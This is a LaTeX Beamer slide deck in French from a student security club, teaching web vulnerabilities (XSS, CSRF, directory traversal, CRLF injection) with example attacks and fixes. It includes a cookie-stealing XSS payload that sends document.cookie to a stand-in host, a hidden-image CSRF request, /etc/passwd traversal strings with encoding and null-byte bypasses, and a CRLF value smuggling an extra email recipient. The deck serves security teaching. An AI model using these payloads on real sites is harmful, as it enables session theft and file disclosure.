
\documentclass{beamer}

\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage[english]{babel}
\usepackage{lmodern}
% \usepackage{forloop}
\usepackage{multicol}
\usepackage{animate}
\usepackage{default}
\usepackage{listing}

\usepackage[list=true]{subcaption}
\captionsetup{compatibility=false}
\usepackage{etex}


\usepackage{tikz}
\usepackage{pgfplots}

% \usepackage{polyglossia}
% \usepackage{listings}
% \usepackage{ulem}
% \usepackage{multicol}

% \setbeamertemplate{navigation symbols}{}
% \setbeamertemplate{sidebar right}{}
% \setbeamertemplate{footline}{\hfill\insertframenumber{} | \inserttotalframenumber}


% \newcommand{\myline}{\par
%     \kern0.5pt
%     \hrule height 0.8pt
%     \kern0.5pt
% }

\usecolortheme{cormorant}
\useoutertheme{infolines}



\title[Failles Web]{H4ck 1n TN}
\subtitle{Failles Web}
\author[H4ck1nTN]{Valentin STERN}
\institute[HiT]{Ceten -- TELECOM Nancy}
\date{\today}
\logo{\includegraphics[width=1.3cm]{logo.png}}

\begin{document}

\begin{frame}
\titlepage
\end{frame}

\begin{frame}{D'où viennent les failles?}
	Du serveur en général\\
	Surtout en PHP car c'est le langage le plus utilisé\\
	Pas développé de manière sécurisé au départ
\end{frame}

\begin{frame}{Les failles vues dans cette présentation}
	Faille XSS\\
	CSRF\\
	Transversal directory\\
	CRLF\\
\end{frame}

\begin{frame}{Faille XSS}
	Utilisée en général pour voler des cookies\\
	Pour rediriger vers des pubs\\
	Embêter les utilisateurs
\end{frame}

\begin{frame}{Son fonctionnement}
	Nécessite un formulaire qui réaffiche les données entrées\\
	Permet d'éxécuter du javascript sur le client d'autres personnes\\
	Par exemple : <script>alert('Hello')</script>
\end{frame}

\begin{frame}{Comment voler les cookies ?}
	Contenus dans document.cookie\\
	Nécessite un serveur, avec un fichier enregistrant ce qu'on lui envoie\\
	<script>window.location.replace('http://monsite.org/index.php?c=' + document.cookie.toString())</script>
\end{frame}

\begin{frame}{Comment la sécuriser ?}
	Echapper les caractères\\
	Remplace donc par exemple < par \&lt\;\\
	Affiche donc au final <script>alert('Hello')</script> et n'éxécute pas le code
\end{frame}

\begin{frame}{CSRF}
	Acronyme de Cross-Site Request Forgery\\
	Permet d'utiliser les droits d'un autre utilisateur pour faire ce que l'on veut
\end{frame}

\begin{frame}{Comment ça marche?}
	Demander à un utilisateur d'aller sur un lien\\
	Ou le cacher dans une image :\\
	<img src="http://monsite.org/compte.php?numeroCompte=1337" width="0" height="0" border="0">\\
	L'utilisateur va donc effectuer l'action que l'on veut avec sa session
\end{frame}

\begin{frame}{Comment la sécuriser ?}
	Ajouter un token nécessaire dans chaque formulaire sur le site que l'on veut sécuriser\\
	<input type="hidden" name="CSRFToken" value="Token chiffré">
\end{frame}

\begin{frame}{Directory traversal}
	Principe : Accéder à un dossier dont nous ne sommes pas autorisé\\
	Passe par l'inclusion de page avec des paramètres\\
	Par exemple : <?php include ('/home/users/web/views/' . \$\_GET['view']); ?>\\
	On accède donc à l'accueil par : \\
	http://monsite.org/index.php?view=accueil.php
\end{frame}

\begin{frame}{Exploiter cela}
	Envoyer une vue naviguant dans les dossiers\\
	Par exemple : '../../../../../../../../../etc/passwd' et accéder au fichier de password de la machine\\
	On peut ainsi accéder au fichier que l'on veut sur la machine !
\end{frame}

\begin{frame}{Comment la sécuriser ?}
	On peut penser que l'on peut interdir les caractères ../ ou même simplement ..\\
	Mais dans ce cas on peut envoyer l'encodage URL des caractères : %2e%2e%2f = ../\\
	Dans ce cas cette sécurisation ne sert à rien
\end{frame}

\begin{frame}{Comment la sécuriser ?}
	Tout simplement : include(\$\_GET['file'] . '.html')\\
	Limite donc les fichiers à ceux au format HTML\\
	Mais ne fonctionne pas si l'on rajoute %00
\end{frame}

\begin{frame}{Quelle est la solution?}
	Ne plus utiliser ce type d'inclusion de page
\end{frame}

\begin{frame}{CRLF}
	CRLF signifie Carriage Return Line Feed\\
	Carriage Return : Retour Chariot \textbackslash r\\
	Line Feed : Saut de ligne \textbackslash n\\
	Consiste donc à placer des fin de ligne à certains endroits
\end{frame}

\begin{frame}{Où placer ces caractères}
	Où?\\
	Dans l'input des envois de mails de mot de passe oublié\\
	Le retour a la ligne signife un destinataire supplémentaire\\
	On peut donc envoyer des mails grâce au site web de la victime
\end{frame}

\begin{frame}{Son utilité}
	Envoie deux mails avec le nouveau mot de passe\\
	mail1@service.com\%0A\%0Dmail2@service.com
\end{frame}

\begin{frame}{Comment sécuriser?}
	\$chaine\_secure = str\_replace(array("\textbackslash n","\textbackslash r",PHP\_EOL),'',\$chaine\_utilisateur);
\end{frame}

\end{document}
